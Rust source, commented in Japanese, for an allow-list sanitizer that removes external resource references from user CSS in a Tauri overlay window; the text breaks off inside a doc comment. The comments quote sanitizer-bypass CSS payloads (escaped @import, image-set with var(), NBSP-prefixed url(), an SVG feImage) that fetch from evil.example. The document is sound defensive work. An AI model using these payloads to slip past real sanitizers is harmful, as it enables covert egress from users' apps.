//! 060b: ユーザー CSS から**外部リソース参照を取り除く**サニタイザ。
//!
//! ⚠⚠ **これは「念のための処理」ではない。** `tauri.conf.json` の `csp` は `null`（＝CSP を強制していない）で、
//! Tauri v2 の `csp` はアプリ全体に 1 つしか無く `comment-viewer` 窓が Twitch / YouTube / VOICEVOX / OBS への
//! `connect-src` を要するため、**オーバーレイ窓だけに効かせることができない**（060a レビュー S-4）。
//! 一方 060a のセレクタ契約により、ユーザー CSS は**オーバーレイの全要素を文書化された名前で確定的に狙える**
//! （060a レビュー S-3）。＝**ここが唯一の壁**であり、除去漏れはそのまま
//! 「オーバーレイ窓から外部 GET が飛ぶ」＝ docs/security.md §1 の直接違反になる。
//!
//! # 方式: deny-list ではなく allow-list
//!
//! 060b のタスクファイルは当初「`http…` / `//…` に見えるものを消す」という deny-list で書かれていたが、
//! **それは CSS エスケープで自明に破れる**ため採らなかった:
//!
//! ```text
//! @import "\68ttps://evil.example/a.css";   /* \68 → h。復元すると https:// */
//! @import "htt\
//! ps://evil.example/a.css";                 /* 文字列内の \改行 は行継続として消える */
//! ```
//!
//! 「URL が何に見えるか」で判定する方式は、判定の前に CSS のエスケープを完全に復元する必要があり
//! （＝結局パーサが要る）、しかも**見落としが「残す側」＝危険側に倒れる**。
//!
//! allow-list ではこれが反転する。生き残るには「**エスケープを 1 つも含まず**、リテラルで `data:` から
//! 始まる」必要があるので、難読化された時点で自動的に除去される。**判定の失敗が常に安全側へ倒れる。**
//!
//! # 除去規則
//!
//! | 位置 | 動作 |
//! |---|---|
//! | `@import`（`url()` 形・素の文字列形とも） | **無条件で文全体を除去**。宛先を [`SanitizeOutcome::stripped_import_urls`] へ記録 |
//! | `@namespace` | 文全体を除去（下記「なぜ `@namespace` も落とすのか」） |
//! | 宣言値の `url(…)` | **エスケープ無し・制御文字無し・`#` 無し・ASCII 大小無視で `data:` 始まり**のときだけ残す。それ以外は**宣言まるごと**除去 |
//! | [`BARE_STRING_URL_FUNCTIONS`]（`image-set()` 系 4 種 / `image()` / `src()`） | **中身に関わらず宣言まるごと**除去（下記 ⚠⚠） |
//! | ブロック系アットルールの**プレリュード**内の**取り除けない**参照（`@media (…url(http…))`） | **取り込み自体を拒否**（fail-closed） |
//! | 未終端の文字列 / コメント / `url(`、深すぎる入れ子 | 除去または拒否（「残す」判断を絶対にしない） |
//!
//! ⚠⚠ **裸の文字列を URL として扱う関数を、中身に関わらず落とす理由**: `image-set()` は
//! **引用符だけの裸の文字列を URL として扱う**関数で、しかも `var()` 置換の的になる。
//!
//! ```text
//! --a: "https://evil.example/x.png";        /* url() でも @import でもない、ただの文字列 */
//! background-image: image-set(var(--a) 1x); /* 置換後に URL 位置へ入る ＝ egress */
//! ```
//!
//! `url()` だけを見る実装はこれを素通しする。該当関数を含む**宣言を無条件で落とす**と、
//! `--a: image-set(…)` のようにカスタムプロパティ側へ隠す形も同時に閉じる（カスタムプロパティも宣言なので）。
//! なお `var(--a)var(--b)` でトークンを継ぎ接ぎして関数トークンを合成する形は、CSS の置換仕様が
//! 再トークン化を禁じている（Chromium 実装済み）ため成立しない。
//!
//! ⚠⚠ **この表は「実装済みかどうか」で決めてはいけない**（security-review S-2）。初版は
//! 「`image-set()` は裸の文字列を URL 化する**唯一の実装済み**関数」という理由づけで表を閉じていたが、
//! CSS Values 4 の **`src()`** は `<string>` を取り **`var()` 置換可能であることが存在理由**の URL 関数で、
//! 現在どの engine も未実装なだけである。**出荷された瞬間に我々のコードを 1 行も変えずに壁が開く**
//! （実測で `src:src("https://evil…")` / `src(var(--u))` が素通りしていた）。
//! → **再修正トリガー＝新しい CSS の画像 / URL 関数が仕様に入ったら、実装状況を問わず表へ足す。**
//!
//! ⚠ **`@import` では `data:` も許さない理由**: `@import url("data:text/css,@import url(https://evil…)")` は
//! **入れ子の `@import` をブラウザが辿る**＝ egress。`data:` の許可は**宣言値の `url()` 位置に限る**。
//!
//! ⚠ **なぜ `@namespace` も落とすのか**: 名前空間 URI は**取得されない**ので害は無いが、残すと
//! 「出力に生きた `url(http…)` が存在してよい例外」が 1 つできてしまい、下記の残留検証が
//! 条件付きの弱い不変条件に退化する。XML 名前空間は HTML だけのオーバーレイ DOM では意味を持たないので、
//! **不変条件を 1 本に保つほうを採った**。
//!
//! ⚠ **相対 URL は egress ではないが、それでも除去する**: webview のオリジンは Tauri のカスタムプロトコル
//! （macOS `tauri://localhost` / Windows `http://tauri.localhost`）なので `url(/x.png)` は外へ出ない。
//! それでも落とすのは、バンドル内に狙う意味のある資産が無く、**規則を 1 本に保つほうが監査しやすい**ため。
//! ⚠ ただし **`url(//evil.example/x.png)`（プロトコル相対）は Windows では実 egress になる**
//! （オリジンが `http:` のため）。「相対だから安全」と読み替えないこと。
//!
//! ⚠ **`url(#frag)` も落とす**: 同一文書フラグメントなので egress にならないが、ユーザー CSS から
//! オーバーレイ DOM へ SVG を持ち込む手段が無く**実用上死んでいる**ため、許可形を `data:` 1 つに絞る。
//! **再修正トリガー＝ 060d 以降が SVG 要素をオーバーレイ DOM に入れるようになったら**、この前提が崩れる
//! （`url(#f)` が意味を持ち始める）ので、ここの判断を見直すこと。
//!
//! # 残留検証（post-condition）
//!
//! 除去後の出力をもう一度走査し、許可形以外の url 位置トークンが 1 つも残っていないことを表明する
//! （[`find_residual_violation`]）。残っていたら取り込みを**拒否**する。
//! ⚠ **同じトークナイザを使うので、トークナイザ自体のバグは検出できない**（そこは下の敵対的入力の
//! テスト群とミューテーションの担当）。これが殺すのは「**数えたのに消していない**」「消す範囲を間違えた」型と、
//! **ブロック構造の解釈がずれたケース**——構造がずれても検出はトークン単位で行われるので、
//! 「url が漏れる」ではなく「取り込みが拒否される」へ劣化する。
//!
//! # 既知の限界（再修正トリガー付き）
//!
//! - ⚠⚠ **`url(data:image/svg+xml,…)` の SVG 内部は解釈しない。** CSS の `url()` 経由で**画像として**
//!   読まれた SVG は **secure static mode** となり外部参照・スクリプトが仕様上禁止される、という
//!   ブラウザ側の保証に依存している。フラグメント付き（＝**リソース文書**として読まれる形）は
//!   [`is_allowed_url_value`] が `#` で落とすが、**フラグメント無しの SVG data URI が `filter:` /
//!   `clip-path:` でリソース文書として読まれるかは未実測**（security-review S-5）。
//!   実測で以下が**そのまま保存される**ことは確認済み（fetch されるかは未確認）:
//!   ```text
//!   .a{filter:url("data:image/svg+xml,<svg …><filter id='f'><feImage href='https://evil…'/></filter></svg>")}
//!   ```
//!   **⚠ MIME 許可リストへ踏み込む前に、まず実測すること**（アプリ不要・5 分）:
//!   `python3 -m http.server 8000` を上げ、上記を `http://127.0.0.1:8000/HIT.png` 参照に書き換えた
//!   素の HTML を **Safari（WKWebView 相当）と Edge（WebView2 相当）**で開く。アクセスログに `HIT` が
//!   1 件でも出たら → **再修正トリガー発火**＝`data:` の MIME 許可リスト
//!   （`image/png|jpeg|gif|webp|avif` ＋ `font/woff2` 等・**`image/svg+xml` を除外**）へ踏み込む。
//!   出なければ現状維持でよいが、**実測した事実を progress.md に残すこと**。
//!   （実測せずに MIME リストへ行くと、SVG アイコンを data URI で入れる実在のチャット CSS を無用に壊す。）
//!   再修正トリガーはもう 1 つ＝この secure static mode の保証が破れる CVE が出たとき。
//! - **CSS の完全なパーサではない**（新規依存ゼロの制約）。担保は敵対的入力コーパス＋ミューテーション。
//! - **セレクタ変換（060a の `cssCompat.ts`）には一切関与しない。** 保存するのは変換前の CSS で、
//!   変換は注入時に frontend が毎回行う（060b タスクファイルの決定）。ここで再実装しないこと。

use crate::error::{AppError, AppResult};

/// 除去した `@import` 先を戻り値へ載せる上限（件数）。
///
/// ⚠ ユーザー CSS 由来の**未署名文字列**なので、素のままだと件数も 1 件の長さも入力次第で無制限になる
/// （060a レビュー S-1 と同型）。UI へ渡る前にここで切る。
const MAX_STRIPPED_IMPORT_URLS: usize = 16;

/// 同じく 1 件あたりの長さ上限（文字数）。ブラウザの実用的な URL 長を十分に超える値。
const MAX_STRIPPED_IMPORT_URL_CHARS: usize = 2048;

/// `{}` の入れ子の上限。
///
/// ⚠ **これが無いと深い入れ子でスタックオーバーフローする**（= abort。`AppResult` では捕まらない）。
/// 現実の CSS は数段しか入れ子にならず、060a のレビューが 5000 段の病的入力を通していることから、
/// 上限を持つこと自体が要件。超えたら fail-closed で拒否する。
/// ⚠ 実効値は「`{` が 64 段までは通り、**65 段目で拒否**」（`scan_content` は `depth > MAX` で落とすので、
/// トップレベル＝ depth 0 から数えて `{` 64 個までが有効）。
const MAX_NESTING_DEPTH: usize = 64;

/// **裸の文字列を URL として扱いうる関数**（＝`url()` を見ているだけでは塞げない経路）。
///
/// ⚠ **ここに載った関数を含む宣言は、中身に関わらず落とす**（module doc の ⚠⚠ を参照）。
/// ⚠⚠ **判断基準は「仕様に `<string>` を URL として取る形があるか」であって「engine が実装済みか」ではない**
/// （security-review S-2）。`src()` は CSS Values 4 の `<url> = <url()> | <src()>` の片割れで、
/// **`var()` 置換可能であることが存在理由**の URL 関数。現在どの engine も未実装だが、
/// 出荷された瞬間に壁が開くので**先に載せてある**。`src(` は今日の CSS に他の用途が無い
/// （`@font-face` の `src:` はプロパティなので `(` を伴わない）ので誤爆しない。
/// **再修正トリガー＝新しい CSS の画像 / URL 関数が仕様に入ったら、実装状況を問わずここへ足す。**
///
/// 載せていないもの: `cross-fade()` / `-webkit-cross-fade()` は `<image>` しか取らず裸の文字列を
/// URL 化しないので `url()` の規則で足りる。`element()` / `-moz-element()` は同一文書の要素参照、
/// `paint()` は JS から登録した worklet が要るので、いずれも取得経路にならない。
const BARE_STRING_URL_FUNCTIONS: [&str; 6] = [
    "image-set",
    "-webkit-image-set",
    "-moz-image-set",
    "-o-image-set",
    "image",
    "src",
];

/// サニタイズの結果。
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SanitizeOutcome {
    /// 除去後の CSS。
    pub css: String,
    /// 除去した参照の総数。
    ///
    /// ⚠ 「外部参照の数」ではなく「**取り込めなかった参照の総数**」。相対 URL や `url(#frag)` のように
    /// そもそも外部通信にならないものも allow-list により除去され、ここに数えられる。
    pub stripped_count: u32,
    /// 除去した `@import` の宛先（060c の同意ダイアログ用）。
    ///
    /// ⚠ **載るのは「取得できて・偽装できない形」だけ**（詳細と理由は [`Scanner::record_import_url`]）:
    /// エスケープを含む宛先は載せない（難読化された URL を fetcher へ渡さない）／
    /// **`http://` `https://` の絶対 URL のみ**（相対・`data:`・`javascript:`・`file:` は載せない）／
    /// **bidi / format 文字を含むものは載せない**（同意ダイアログの表示偽装対策）。
    /// いずれも**除去と計数はしている**ので、`stripped_count >= stripped_import_urls.len()` が常に成り立つ。
    pub stripped_import_urls: Vec<String>,
}

/// CSS から外部リソース参照を取り除く。取り除ききれない形は `Err`（fail-closed）。
///
/// ⚠ 呼び出し側（`service`）が事前に BOM 除去・UTF-8 検証・サイズ上限・本文の制御文字検査を済ませている前提。
/// ここは**参照の除去だけ**を責務にする。
pub fn sanitize_css(input: &str) -> AppResult<SanitizeOutcome> {
    let src: Vec<char> = input.chars().collect();
    let mut scanner = Scanner::new(&src);
    scanner.scan_content(0)?;

    let css = build_output(&src, &scanner.removals);

    // 残留検証。ここで落ちるのは「消したつもりで消えていない」場合なので、保存せずに拒否する。
    let residual: Vec<char> = css.chars().collect();
    if find_residual_violation(&residual).is_some() {
        return Err(reject_residual());
    }

    Ok(SanitizeOutcome {
        css,
        stripped_count: scanner.stripped_count,
        stripped_import_urls: scanner.stripped_import_urls,
    })
}

// --- エラー（すべて固定文言。ユーザー入力・URL・CSS 本文を一切補間しない・§9） -------------------

fn reject_prelude_url() -> AppError {
    // ⚠ 文言は「外部参照」ではなく「取り除けない参照」。相対 URL や image-set() でもここに来るので、
    // 「外部」と言い切ると事実と食い違う（security-review S-7）。
    AppError::validation(
        "この CSS は取り込めません。@media / @supports などの条件部分に、取り除けない参照が書かれています。該当箇所を削ってから取り込んでください。",
    )
}

fn reject_residual() -> AppError {
    AppError::validation("この CSS は取り込めません。外部参照を安全に取り除けませんでした。")
}

fn reject_too_deep() -> AppError {
    AppError::validation("この CSS は取り込めません。入れ子が深すぎます。")
}

// --- 文字種 -------------------------------------------------------------------------------------

/// CSS の空白（U+000C フォームフィードを含む）。
fn is_ws(c: char) -> bool {
    matches!(c, ' ' | '\t' | '\n' | '\r' | '\u{0C}')
}

/// 識別子を構成しうる文字（エスケープ `\` は呼び出し側で別に扱う）。
///
/// 貪欲に読むのが正しい: CSS の識別子トークンは ident 文字を可能な限り消費するので、`xurl(` は
/// `url` ではなく `xurl` という 1 つの識別子になる。緩く読むことで「途中から `url` を拾ってしまう」
/// 誤検知ではなく、**正しい区切り**が得られる。
///
/// ⚠⚠ **非 ASCII を ident 文字に含めない**（security-review S-1）。CSS の識別子は非 ASCII も取れるが、
/// ここを `>= 0x80` にすると貪欲読みと相まって **`<NBSP>url` が 1 つの識別子**になり、名前が `"url"` に
/// 一致せず**除去も残留検証もすり抜ける**（実測: `.a{background:<NBSP>url(https://evil…)}` が無傷で通り、
/// `@import<NBSP>url("https://evil…")` は at-keyword ごと外れて**文が丸ごと残った**）。
/// css-syntax-3 の現行仕様では U+00A0 / U+00D7 / U+2003 / U+2192 などは ident code point **ではない**ので、
/// 仕様どおりの実装はここを分割して `url(` を url-token として読む＝ egress。
/// Blink / WebKit は歴史的に `>= 0x80` を ident-start にしているため**今日は fetch されない公算が高いが、
/// WKWebView / WebView2 は OS 更新で入れ替わる**＝我々のコードを変えずに前提が壊れる。
///
/// **ASCII に絞ると「我々が分割してブラウザが結合する」側にしか倒れない＝過剰除去にしかならない**
/// （逆向きの取りこぼしは構造的に起きない）。日本語のクラス名 `.配信用{…}`・カスタムプロパティ
/// `--画像:`・`content:"配信中 …"` は誤爆しないことを実測済み。
fn is_ident_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || c == '_' || c == '-'
}

/// 値が ASCII 大小無視で `prefix` から始まるか（アロケーションなし）。
fn starts_with_ascii_ci(value: &str, prefix: &str) -> bool {
    let mut chars = value.chars();
    for expected in prefix.chars() {
        match chars.next() {
            Some(c) if c.eq_ignore_ascii_case(&expected) => {}
            _ => return false,
        }
    }
    true
}

/// 値が ASCII 大小無視で `data:` から始まるか。
fn starts_with_data_scheme(value: &str) -> bool {
    starts_with_ascii_ci(value, "data:")
}

/// 値が ASCII 大小無視で `http://` / `https://` から始まるか。
fn starts_with_http_scheme(value: &str) -> bool {
    starts_with_ascii_ci(value, "http://") || starts_with_ascii_ci(value, "https://")
}

/// 同意ダイアログへ載せてはいけない文字（制御文字＋**表示を偽装できる bidi / format 文字**）。
///
/// ⚠ `char::is_control` は U+202E（RTL override）等を弾かない。詳細は [`Scanner::record_import_url`]。
fn is_unsafe_in_import_url(c: char) -> bool {
    c.is_control()
        || matches!(c,
            '\u{061C}'                // ARABIC LETTER MARK
            | '\u{200E}'..='\u{200F}' // LRM / RLM
            | '\u{202A}'..='\u{202E}' // LRE / RLE / PDF / LRO / RLO
            | '\u{2066}'..='\u{2069}' // LRI / RLI / FSI / PDI
        )
}

/// この `url()` の中身を**残してよいか**。
///
/// ⚠ **allow-list の中心**。ここを緩めるとサニタイザ全体が意味を失う。
/// エスケープを 1 つでも含むものは、たとえ復元結果が `data:` でも**落とす**——
/// 「難読化されている」こと自体が拒否理由（判定を復元に依存させない＝ deny-list の失敗を繰り返さない）。
///
/// ⚠⚠ **フラグメント（`#`）を含む `data:` も落とす**（security-review で追加）。
/// `data:` を許すのは「SVG を**画像として**読む経路は **secure static mode** になり、外部参照も
/// スクリプトも仕様上禁止される」という保証に依存しているが、**`filter:` / `mask:` / `clip-path:` は
/// SVG を「画像」ではなく「リソース文書」として読む**ので、その保証が及ぶとは限らない。
/// リソース参照は対象要素を指すために**必ずフラグメントを要する**（`url("data:image/svg+xml,…#f")`）ので、
/// `#` を落とせばこの経路がまとめて閉じる。
/// ⚠ 正当な損失はほぼゼロ: data URI の本体に生の `#` を書くと URL としてフラグメント扱いになって
/// そもそも壊れる（実在の SVG data URI は `%23` を使う）し、base64 の文字集合に `#` は無い。
/// 再修正トリガー＝フラグメント無しの SVG data URI が `filter:` でも取得されると分かったら、
/// MIME 許可リスト（`image/svg+xml` を除外）へ踏み込むこと。
fn is_allowed_url_value(token: &UrlToken) -> bool {
    !token.has_escape
        && !token.malformed
        && !token.value.chars().any(char::is_control)
        && !token.value.contains('#')
        && starts_with_data_scheme(&token.value)
}

// --- トークン -----------------------------------------------------------------------------------

/// 文字列リテラルの中身。
struct StrLit {
    /// エスケープを復元した値。
    value: String,
    /// エスケープ（`\` 由来の変換・行継続を含む）が 1 つでもあったか。
    has_escape: bool,
}

/// `url()` の中身。
struct UrlToken {
    value: String,
    has_escape: bool,
    /// 閉じ括弧に正しく到達しなかった（bad-url / EOF）。
    malformed: bool,
}

/// 1 つの「文」（宣言 または 文アットルール）を走査した結果。
#[derive(Default)]
struct UnitScan {
    /// 許可されない url 位置の数。
    disallowed: u32,
    /// 画像系関数（`image-set()` 等）が現れた。
    image_fn: bool,
    /// 文の先頭のアットキーワード（`@` 直後の識別子・小文字化・エスケープ復元済み）。
    at_keyword: Option<String>,
    /// `@import` の宛先（記録できる形のときだけ）。
    import_url: Option<String>,
    /// url 位置が 1 つでもあったか（ブロックのプレリュード判定に使う）。
    any_url_position: bool,
}

/// 文の終わり方。
enum Terminator {
    Semicolon,
    OpenBrace,
    CloseBrace,
    Eof,
}

// --- 走査 ---------------------------------------------------------------------------------------

struct Scanner<'a> {
    src: &'a [char],
    i: usize,
    /// 削除する半開区間。走査順に積むので**昇順・非重複**になる。
    removals: Vec<(usize, usize)>,
    stripped_count: u32,
    stripped_import_urls: Vec<String>,
}

impl<'a> Scanner<'a> {
    fn new(src: &'a [char]) -> Self {
        Scanner {
            src,
            i: 0,
            removals: Vec::new(),
            stripped_count: 0,
            stripped_import_urls: Vec::new(),
        }
    }

    fn peek(&self) -> Option<char> {
        self.src.get(self.i).copied()
    }

    fn peek_at(&self, offset: usize) -> Option<char> {
        self.src.get(self.i + offset).copied()
    }

    fn skip_ws(&mut self) {
        while self.peek().is_some_and(is_ws) {
            self.i += 1;
        }
    }

    /// `/*` の位置で呼ぶ。閉じない場合は EOF まで。
    fn skip_comment(&mut self) {
        self.i += 2;
        while self.i < self.src.len() {
            if self.peek() == Some('*') && self.peek_at(1) == Some('/') {
                self.i += 2;
                return;
            }
            self.i += 1;
        }
    }

    fn skip_ws_and_comments(&mut self) {
        loop {
            match self.peek() {
                Some(c) if is_ws(c) => self.i += 1,
                Some('/') if self.peek_at(1) == Some('*') => self.skip_comment(),
                _ => return,
            }
        }
    }

    /// `\` の位置で呼び、復元した 1 文字を返す。
    fn consume_escape(&mut self) -> char {
        self.i += 1;
        let Some(first) = self.peek() else {
            return '\u{FFFD}';
        };
        if !first.is_ascii_hexdigit() {
            self.i += 1;
            return first;
        }
        let mut value: u32 = 0;
        let mut digits = 0;
        while digits < 6 {
            match self.peek() {
                Some(h) if h.is_ascii_hexdigit() => {
                    value = value * 16 + h.to_digit(16).unwrap_or(0);
                    self.i += 1;
                    digits += 1;
                }
                _ => break,
            }
        }
        // 16 進エスケープの直後の空白 1 つは終端記号として食う（`\r\n` は 2 文字で 1 つ扱い）。
        if self.peek() == Some('\r') && self.peek_at(1) == Some('\n') {
            self.i += 2;
        } else if self.peek().is_some_and(is_ws) {
            self.i += 1;
        }
        // NUL・サロゲート・範囲外は U+FFFD（CSS 仕様どおり）。
        char::from_u32(value)
            .filter(|c| *c != '\0')
            .unwrap_or('\u{FFFD}')
    }

    /// 識別子を貪欲に読む。返すのは（復元済みの値, エスケープを含んだか）。
    ///
    /// ⚠ **エスケープを復元してから比較する**のが迂回対策の中核（`\75 rl(` / `u\72 l(` / `@\69 mport`）。
    fn consume_ident(&mut self) -> (String, bool) {
        let mut value = String::new();
        let mut has_escape = false;
        loop {
            match self.peek() {
                Some('\\') => {
                    // 直後が改行なら有効なエスケープではない＝識別子はここで終わる。
                    match self.peek_at(1) {
                        None | Some('\n') | Some('\r') | Some('\u{0C}') => return (value, has_escape),
                        _ => {}
                    }
                    has_escape = true;
                    value.push(self.consume_escape());
                }
                Some(c) if is_ident_char(c) => {
                    value.push(c);
                    self.i += 1;
                }
                _ => return (value, has_escape),
            }
        }
    }

    /// 引用符の位置で呼ぶ。閉じ引用符 / 改行 / EOF まで読む。
    fn consume_string(&mut self) -> StrLit {
        let Some(quote) = self.peek() else {
            return StrLit {
                value: String::new(),
                has_escape: false,
            };
        };
        self.i += 1;
        let mut value = String::new();
        let mut has_escape = false;
        while let Some(c) = self.peek() {
            if c == quote {
                self.i += 1;
                break;
            }
            match c {
                // bad-string: 改行では閉じずに打ち切る（改行自体は消費しない）。
                '\n' | '\r' | '\u{0C}' => break,
                '\\' => match self.peek_at(1) {
                    None => self.i += 1,
                    // ⚠ 行継続。`"htt\<改行>ps://…"` が `https://…` に復元される経路そのもの。
                    Some('\n') | Some('\u{0C}') => {
                        has_escape = true;
                        self.i += 2;
                    }
                    Some('\r') => {
                        has_escape = true;
                        self.i += 2;
                        if self.peek() == Some('\n') {
                            self.i += 1;
                        }
                    }
                    _ => {
                        has_escape = true;
                        value.push(self.consume_escape());
                    }
                },
                _ => {
                    value.push(c);
                    self.i += 1;
                }
            }
        }
        StrLit { value, has_escape }
    }

    /// bad-url を閉じ括弧（または EOF）まで読み飛ばす。
    fn skip_to_close_paren(&mut self) {
        while let Some(c) = self.peek() {
            match c {
                ')' => {
                    self.i += 1;
                    return;
                }
                '\\' if self.peek_at(1).is_some() => self.i += 2,
                _ => self.i += 1,
            }
        }
    }

    /// `url(` の `(` を消費した直後に呼ぶ。閉じ括弧まで読む。
    fn consume_url_value(&mut self) -> UrlToken {
        self.skip_ws();
        if matches!(self.peek(), Some('"') | Some('\'')) {
            let literal = self.consume_string();
            let mut malformed = false;
            self.skip_ws();
            if self.peek() == Some(')') {
                self.i += 1;
            } else {
                malformed = true;
                self.skip_to_close_paren();
            }
            return UrlToken {
                value: literal.value,
                has_escape: literal.has_escape,
                malformed,
            };
        }

        let mut value = String::new();
        let mut has_escape = false;
        let mut malformed = false;
        loop {
            match self.peek() {
                None => {
                    malformed = true;
                    break;
                }
                Some(')') => {
                    self.i += 1;
                    break;
                }
                Some(c) if is_ws(c) => {
                    self.skip_ws();
                    if self.peek() == Some(')') {
                        self.i += 1;
                    } else {
                        malformed = true;
                        self.skip_to_close_paren();
                    }
                    break;
                }
                Some('\\') => match self.peek_at(1) {
                    None | Some('\n') | Some('\r') | Some('\u{0C}') => {
                        malformed = true;
                        self.i += 1;
                    }
                    _ => {
                        has_escape = true;
                        value.push(self.consume_escape());
                    }
                },
                // ⚠ CSS 仕様上、引用符なし url-token に引用符は現れない（bad-url-token になり、
                // ブラウザは宣言ごと捨てる）。ここを「普通の文字」として飲み込むと、
                // `url(data:x")url("https://…")` のような入力でブラウザとトークン境界の解釈が分かれる。
                // **こちらを常に「壊れている」側へ倒す**ことで、解釈が分かれても必ず除去側になる
                //（security-review で追加）。
                Some('"') | Some('\'') => {
                    malformed = true;
                    self.i += 1;
                }
                Some(c) => {
                    value.push(c);
                    self.i += 1;
                }
            }
        }
        UrlToken {
            value,
            has_escape,
            malformed,
        }
    }

    /// スタイルシート全体（`depth == 0`）または `{}` 1 つ分の中身を走査する。
    ///
    /// 中身は「`;` で終わる文（宣言 / 文アットルール）」と「`{` で始まるブロック（規則 / ブロック
    /// アットルール / 波括弧を値に持つカスタムプロパティ）」の列として一様に扱う。
    /// この一様化のおかげで、`@media` / `@supports` / `@font-face` / `@keyframes` / CSS Nesting /
    /// `--foo: { … }` を個別に知らなくても正しく走査できる。
    fn scan_content(&mut self, depth: usize) -> AppResult<()> {
        if depth > MAX_NESTING_DEPTH {
            return Err(reject_too_deep());
        }
        loop {
            let unit_start = self.i;
            let mut unit = UnitScan::default();
            match self.scan_unit(&mut unit) {
                Terminator::Semicolon => {
                    let unit_end = self.i;
                    self.decide_unit(unit_start, unit_end, &unit);
                }
                Terminator::OpenBrace => {
                    // ⚠ プレリュードに**取り除けない**参照があるときは「その 1 つだけ消す」が構文上
                    // きれいに表現できず、ブロックごと消すとユーザーの @media が黙って丸ごと消える。
                    // 実チャット CSS では事実上出現しない形なので、明示的に拒否する（fail-closed）。
                    //
                    // ⚠ **許可形（`data:`）だけのプレリュードは通す**（security-review S-7）。
                    // 判定を `any_url_position` にしていたときは、`data:` しか含まない
                    // `@supports (background:url(data:image/png;base64,AA)){…}` や、実在する
                    // サポート検出イディオム `@supports (background-image:-webkit-image-set(url(a.png) 1x)){…}`
                    // までが「条件部分に外部参照が…」という**事実と違う診断で全拒否**されていた。
                    // 許可形を通しても残留検証が許可形として素通しするので、安全性は変わらない。
                    if unit.disallowed > 0 || unit.image_fn {
                        return Err(reject_prelude_url());
                    }
                    self.i += 1;
                    self.scan_content(depth + 1)?;
                }
                Terminator::CloseBrace => {
                    // `;` を省いた最後の宣言。
                    let unit_end = self.i;
                    self.decide_unit(unit_start, unit_end, &unit);
                    self.i += 1;
                    if depth > 0 {
                        return Ok(());
                    }
                    // トップレベルの迷子の `}` は読み飛ばして続行する（壊れた入力で止まらない）。
                }
                Terminator::Eof => {
                    let unit_end = self.i;
                    self.decide_unit(unit_start, unit_end, &unit);
                    return Ok(());
                }
            }
        }
    }

    /// 次の `;` / `{` / `}` / EOF までを 1 つの文として走査する。
    fn scan_unit(&mut self, unit: &mut UnitScan) -> Terminator {
        // アットキーワードは文の先頭にしか現れないので、先に取っておく。
        self.skip_ws_and_comments();
        if self.peek() == Some('@') {
            self.i += 1;
            let (name, _) = self.consume_ident();
            unit.at_keyword = Some(name.to_ascii_lowercase());
        }

        // `(` `[` の深さ。`;` `{` `}` はこの深さが 0 のときだけ文を区切る
        // （`@supports (a: b)` の中の `;` などで誤って切らないため）。
        let mut paren_depth: usize = 0;
        loop {
            let Some(c) = self.peek() else {
                return Terminator::Eof;
            };
            match c {
                '/' if self.peek_at(1) == Some('*') => self.skip_comment(),
                '"' | '\'' => {
                    let literal = self.consume_string();
                    // ⚠ `@import "…";` の素の文字列形は URL 位置（`url()` を使わない書き方）。
                    if unit.at_keyword.as_deref() == Some("import") && !unit.any_url_position {
                        unit.any_url_position = true;
                        if !literal.has_escape {
                            unit.import_url = Some(literal.value);
                        }
                    }
                }
                '(' | '[' => {
                    paren_depth += 1;
                    self.i += 1;
                }
                ')' | ']' => {
                    paren_depth = paren_depth.saturating_sub(1);
                    self.i += 1;
                }
                ';' if paren_depth == 0 => {
                    self.i += 1;
                    return Terminator::Semicolon;
                }
                '{' if paren_depth == 0 => return Terminator::OpenBrace,
                '}' if paren_depth == 0 => return Terminator::CloseBrace,
                // ⚠ 識別子の開始判定は必ず [`is_ident_char`] に委ねる（`'a'..='z'` 等を直書きしない）。
                // ⚠⚠ **どの識別子でも必ず名前を見て `(` を確認すること。** ここに「この種の識別子は
                // `url` になりえないので読み飛ばす」という近道を作ると、トークン境界の解釈がブラウザと
                // ずれたときに素通りする（security-review S-1 の実際の壊れ方）。
                c if c == '\\' || is_ident_char(c) => {
                    let before = self.i;
                    let (name, _) = self.consume_ident();
                    // 前進の保証（`\` の直後が改行のときなど）。無限ループを構造的に作らない。
                    if self.i == before {
                        self.i += 1;
                        continue;
                    }
                    if self.peek() != Some('(') {
                        continue;
                    }
                    let lower = name.to_ascii_lowercase();
                    if lower == "url" {
                        self.i += 1;
                        let token = self.consume_url_value();
                        unit.any_url_position = true;
                        if unit.at_keyword.as_deref() == Some("import")
                            && unit.import_url.is_none()
                            && !token.has_escape
                            && !token.malformed
                        {
                            unit.import_url = Some(token.value.clone());
                        }
                        if !is_allowed_url_value(&token) {
                            unit.disallowed = unit.disallowed.saturating_add(1);
                        }
                    } else if BARE_STRING_URL_FUNCTIONS.contains(&lower.as_str()) {
                        unit.image_fn = true;
                        unit.any_url_position = true;
                        // `(` は通常どおり数えて、中身も通常どおり走査する（宣言ごと落とすので
                        // 中身の判定結果は使わないが、深さの釣り合いは保つ）。
                        paren_depth += 1;
                        self.i += 1;
                    }
                }
                _ => self.i += 1,
            }
        }
    }

    /// 1 つの文を残すか落とすかを決める。
    fn decide_unit(&mut self, start: usize, end: usize, unit: &UnitScan) {
        if start >= end {
            return;
        }
        // ⚠ `@import` / `@namespace` は中身に関わらず落とす（module doc）。
        let uri_at_rule = matches!(
            unit.at_keyword.as_deref(),
            Some("import") | Some("namespace")
        );
        if !uri_at_rule && !unit.image_fn && unit.disallowed == 0 {
            return;
        }
        // 落とした「参照の数」。画像系関数だけが理由のときは 1 件と数える。
        self.stripped_count = self
            .stripped_count
            .saturating_add(unit.disallowed.max(1));
        if unit.at_keyword.as_deref() == Some("import") {
            if let Some(url) = unit.import_url.as_deref() {
                self.record_import_url(url);
            }
        }
        self.removals.push((start, end));
    }

    /// 060c の同意ダイアログへ渡す `@import` 先を記録する（clamp 付き）。
    ///
    /// ⚠⚠ **`http://` / `https://` 以外は載せない**（security-review S-6）。ここに載る文字列は
    /// 060c の同意ダイアログに**そのまま出る＝ユーザーが取得を許可するか判断する唯一の材料**なので、
    /// 「除去したものを漏れなく報告する」より「**誤解も偽装もできない形だけを渡す**」を優先する:
    /// - `javascript:` / `file:` / `data:` は 060c の取得対象になりえない（載せると誤解を招くだけ）
    /// - 相対 URL（`a.css`）はベース URL が無く**取得しようがない**
    /// - **bidi / format 文字**（U+202E 等）は `char::is_control` では弾けず、
    ///   `https://evil.example/<U+202E>…` のように**別ホストに見える表示**を作れる。
    ///   userinfo（`https://trusted.example@evil.example/…`）と組み合わせると同意ダイアログを騙せる。
    ///
    /// ⚠ 載せなかったぶんも [`SanitizeOutcome::stripped_count`] には数えられている（除去はしている）。
